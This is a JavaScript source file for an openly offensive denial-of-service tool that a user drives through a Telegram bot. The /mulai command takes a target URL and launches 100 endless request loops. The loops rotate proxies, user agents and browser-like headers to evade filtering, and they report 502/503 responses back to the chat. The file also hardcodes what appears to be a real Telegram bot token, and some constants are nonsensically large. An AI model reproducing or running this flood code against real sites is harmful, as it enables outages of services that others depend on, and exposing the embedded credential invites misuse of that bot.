const axios = require('axios');
const fs = require('fs');
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');
const TelegramBot = require('node-telegram-bot-api');

// Telegram bot token from BotFather
const TELEGRAM_TOKEN = '7991511524:AAE1ReD73oQ7p8MRhLtj8UQZf8FxTA1OeG0'; // Replace with your bot token
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

const proxyF = "proxy.txt";
const uaLF = "ua.txt";
const userAgents = fs.readFileSync(uaLF, "utf-8").replace(/\r/g, "").split("\n").map(line => line.trim());

const acceptHeader = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
];

const encodingHeader = ["gzip, deflate, br"];
const langHeader = ["en-US,en;q=0.9"];
const refers = ["https://www.google.com/", "https://www.bing.com/"];
const cplist = ["max-age=0", "no-cache"];

function readProxy() {
    try {
        const data = fs.readFileSync(proxyF, "utf8");
        return data.trim().split("\n").map((line) => line.trim());
    } catch (error) {
        console.error(`Failed to read proxy list: ${error}`);
        return [];
    }
}

function readUA() {
    try {
        const data = fs.readFileSync(uaLF, "utf-8").replace(/\r/g, "").split("\n");
        return data.map((line) => line.trim());
    } catch (error) {
        console.error(`Failed to read user agent list: ${error}`);
        return [];
    }
}

function sanitizeUA(userAgent) {
    return userAgent.replace(/[^\x20-\x7E]/g, "");
}

function randElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function sendReq(target, agent, userAgent, chatId) {
    const sanitizedUserAgent = sanitizeUA(randElement(userAgents));
    const headers = {
        "User-Agent": sanitizedUserAgent,
        Accept: randElement(acceptHeader),
        "Accept-Encoding": randElement(encodingHeader),
        "Accept-Language": randElement(langHeader),
        Referer: randElement(refers),
        "Cache-Control": randElement(cplist),
        DNT: "1",
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        TE: "Trailers",
    };

    axios
        .get(target, { httpAgent: agent, headers: headers, timeout: 0 })
        .then((_) => {
            bot.sendMessage(chatId, "Request sent successfully!");
            setTimeout(() => sendReq(target, agent, userAgent, chatId), 0);
        })
        .catch((error) => {
            if (error.response && error.response.status === 503) {
                bot.sendMessage(chatId, "Server responded with 503, continuing...");
            } else if (error.response && error.response.status === 502) {
                bot.sendMessage(chatId, "Error: Request failed with status code 502");
            } else {
                bot.sendMessage(chatId, `Error: ${error.message}`);
            }
            setTimeout(() => sendReq(target, agent, userAgent, chatId), 0);
        });
}

function sendReqs(targetUrl, chatId) {
    const proxies = readProxy();
    const userAgentsList = readUA();

    if (proxies.length > 0) {
        const proxy = randElement(proxies);
        const proxyParts = proxy.split(":");
        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
        const agent = proxyProtocol === "socks5"
            ? new SocksProxyAgent(proxyUrl)
            : new HttpsProxyAgent(proxyUrl);

        sendReq(targetUrl, agent, randElement(userAgentsList), chatId);
    } else {
        sendReq(targetUrl, null, randElement(userAgentsList), chatId);
    }
}

// Telegram bot commands
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "Welcome to the bot! Use /mulai to start the attack.");
});

bot.onText(/\/mulai/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "Please enter the target URL (e.g., https://example.com):");

    // Listen for the next message from the user
    bot.once('message', (msg) => {
        const url = msg.text.trim();
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            bot.sendMessage(chatId, "Invalid URL. Please enter a valid URL (e.g., https://example.com).");
            return;
        }

        bot.sendMessage(chatId, "🚀 Starting attack... 🤣");
        let continueAttack = true;
        const maxRequests = 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Adjust as needed
        const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Adjust as needed

        const attack = () => {
            try {
                if (!continueAttack) return;

                const userAgent = randElement(userAgents);
                const headers = {
                    'User-Agent': userAgent
                };

                axios.get(url, { headers })
                    .then((response) => {
                        if (response.status === 503) {
                            bot.sendMessage(chatId, "Server responded with 503, continuing...");
                        }
                    })
                    .catch((error) => {
                        if (error.response && error.response.status === 502) {
                            bot.sendMessage(chatId, "Error: Request failed with status code 502");
                        }
                    });

                setTimeout(attack, 1000 / requestsPerSecond);
            } catch (error) {
                bot.sendMessage(chatId, `Error: ${error.message}`);
                setTimeout(attack, 1000 / requestsPerSecond);
            }
        };

        const numThreads = 100; // Reduced for testing; adjust as needed
        for (let i = 0; i < numThreads; i++) {
            attack();
        }

        setTimeout(() => {
            continueAttack = false;
            bot.sendMessage(chatId, "Max requests reached. Attack stopped.");
        }, maxRequests / requestsPerSecond * 1000);
    });
});

// Display startup message
console.log('\033[38;5;46m' +
`            
[Your ASCII art here]
` + '\033[38;5;196m───────────────────────────────────────────\n' +
'\033[38;5;196m[\033[38;5;46m+\033[38;5;196m]\033[38;5;46m VERSION  \033[38;5;196m : \033[38;5;46m2.2\n' +
'\033[38;5;196m[\033[38;5;46m+\033[38;5;196m]\033[38;5;46m AUTHOR   \033[38;5;196m : \033[38;5;46m{> Rizky blackhead <}\n' +
'\033[38;5;196m───────────────────────────────────────────\n' +
'\033[38;5;196m[\033[38;5;46m!]\033[38;5;196m DONT ATTACK: Government Websites\n' +
'\033[38;5;196m[\033[38;5;46m!]\033[38;5;196m DONT ATTACK: Education Websites\n───────────────────────────────────────────\x1b[0m');

console.log("Telegram bot is running...");